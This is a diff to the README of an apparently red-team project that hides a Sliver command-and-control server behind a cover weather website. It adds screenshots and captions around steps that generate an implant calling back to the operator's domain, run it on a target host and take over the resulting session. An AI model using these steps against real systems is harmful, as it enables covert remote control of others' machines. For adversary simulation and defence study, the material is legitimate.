@@ -10,6 +10,11 @@ This project demonstrates how Sliver C2 can be deployed alongside legitimate web
 - **Weather Site**: Legitimate-looking weather application serving as a cover while sourcing live data from the Open-Meteo API
 - **Sliver C2**: Command and control framework for adversary simulation
 
+<p align="center">
+  <img src="png/weather-frontend.png" alt="Weather App UI" width="800"><br>
+  <em>Screenshot: the cover weather application served at <code>/weather/</code> (live Open-Meteo data).</em>
+</p>
+
 ## Architecture
 
 ```
@@ -63,6 +68,11 @@ Copy the environment template and configure it with your values:
 ```bash
 cp env.template .env
 ```
+
+<p align="center">
+  <img src="png/edit-dot-env.png" alt="Editing .env example" width="800"><br>
+  <em>Example <code>.env</code> — copy <code>env.template</code> → <code>.env</code> and set <code>DOMAIN</code>, <code>USE_TLS</code>, and <code>CERTS_HOST_DIR</code>. (Do not commit secrets.)</em>
+</p>
 
 Edit `.env` with your preferred editor and set values that match your deployment:
 
@@ -145,6 +155,11 @@ Replace `your-domain-or-ip.com` with your actual domain or IP from your `.env` f
 generate --http https://your-domain-or-ip.com:443/api/news/ --os linux --arch amd64 --save /home/sliver/builds
 ```
 
+<p align="center">
+  <img src="png/generate-implant.png" alt="Sliver generate implant" width="800"><br>
+  <em>Sliver console: generating an implant and saved to <code>/home/sliver/builds/</code>.</em>
+</p>
+
 **Example** (if your DOMAIN is `example.com`):
 ```bash
 generate --http https://example.com:443/api/news/ --os linux --arch amd64 --save /home/sliver/builds
@@ -181,6 +196,11 @@ After generating the implant, you need to:
    /tmp/your_implant_name
    ```
 
+<p align="center">
+  <img src="png/download-implant.png" alt="Implant binary in Windows Downloads" width="800"><br>
+  <em>Example: generated implant copied to a Windows host Downloads folder prior to execution.</em>
+</p>
+
 3. **Check for active sessions** in the Sliver console:
    ```bash
    sessions
@@ -190,6 +210,11 @@ After generating the implant, you need to:
    ```bash
    use <session-id>
    ```
+<p align="center">
+  <img src="png/use-implant.png" alt="Sliver active session" width="800"><br>
+  <em>Example session after implant execution: <code>use &lt;session-id&gt;</code> and <code>whoami</code> output showing the compromised host identity.</em>
+</p>
+
 
 **Important**: The implant must be executed on the target host for it to establish a connection back to your Sliver C2 server. The implant will attempt to connect to the URL you specified during generation.
 
